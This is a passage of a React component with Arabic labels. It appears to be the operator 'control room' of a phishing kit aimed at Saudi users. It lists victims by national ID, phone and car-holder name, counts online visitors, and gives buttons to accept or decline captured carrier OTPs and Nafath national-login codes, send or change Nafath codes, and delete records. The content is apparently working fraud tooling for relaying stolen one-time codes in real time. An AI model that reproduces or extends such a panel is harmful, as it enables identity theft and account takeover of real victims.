                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptService(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineService(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!isStcNet(c.MotslNetwork) &&
              !isMobilyNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.NavazOtp &&
              !c.mobOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    شبكة عامة — OTP المشغل (قبل نفاذ)
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptPhoneOTP(c._id)}
                    >
                      قبول وإرسال رمز نفاذ
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhoneOTP(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {!c.NavazAccept && c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: نفاذ النهائي
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineNavaz(c._id)}
                  >
                    رفض نفاذ
                  </button>
                  <button
                    className="btn-act accept"
                    style={{ backgroundColor: "#6366f1" }}
                    onClick={() => handleChangeNavazCode(c._id)}
                  >
                    تغيير الرمز
                  </button>
                </div>
              </div>
            )}

            <div className="w-full flex justify-between gap-x-2 mt-2 cc-foot-delete">
              <button
                className="btn-del grow w-full font-bold"
                onClick={() => deleteUser(c._id)}
              >
                <i className="fas fa-trash ml-2"></i> حذف العميل
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();

  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>
            <i className="fas fa-users"></i> العملاء والمرسلون
          </h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label =
                u.name ||
                u.username ||
                u.carHolderName ||
                u.fullname ||
                u.national_id ||
                "مجهول";
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              const userOnline = onlineOrderIds.has(u._id);
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}${u.blocked ? " is-blocked" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
                  <span className="user-sidebar-item__row">
                    <span
                      className={`online-dot${userOnline ? " online-dot--on" : ""}`}
                      title={userOnline ? "متصل" : "غير متصل"}
                    />
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {u.blocked ? (
                      <span className="user-sidebar-item__blocked-tag">
                        محظور
                      </span>
                    ) : null}
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.national_id || u.phone || u.username || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={handleMobileBackToList}
              >
                <i className="fas fa-arrow-right"></i> القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div
                className="mobile-top-user"
                title={
                  selectedUser.name || selectedUser.carHolderName || "مجهول"
                }
              >
                <span className="mobile-top-user__name">
                  {selectedUser.name || selectedUser.carHolderName || "مجهول"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">
              <i className="fas fa-terminal"></i> غرفة التحكم المركزية
            </span>
          </div>
          <div className="top-actions">
            <div className="stats-pill stats-pill--visitors">
              <span className="pulse-dot pulse-dot--inline"></span>
              زوار: {onlineCounts.visitors}
            </div>
            <div className="stats-pill stats-pill--admins">
              أدمن: {onlineCounts.dashboard}
            </div>
            <div className="stats-pill">إجمالي الطلبات: {Users.length}</div>
            <button className="btn-action btn-del-all" onClick={deleteAllUsers}>
              <i className="fas fa-trash-alt"></i> حذف جميع العملاء
            </button>
            <button className="btn-action btn-out" onClick={handleLogOut}>
              <i className="fas fa-sign-out-alt"></i> تسجيل خروج
            </button>
          </div>
        </header>

        <div
          className="grid-container grid-container--single"
          id="clients-container"
        >
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main_Page;
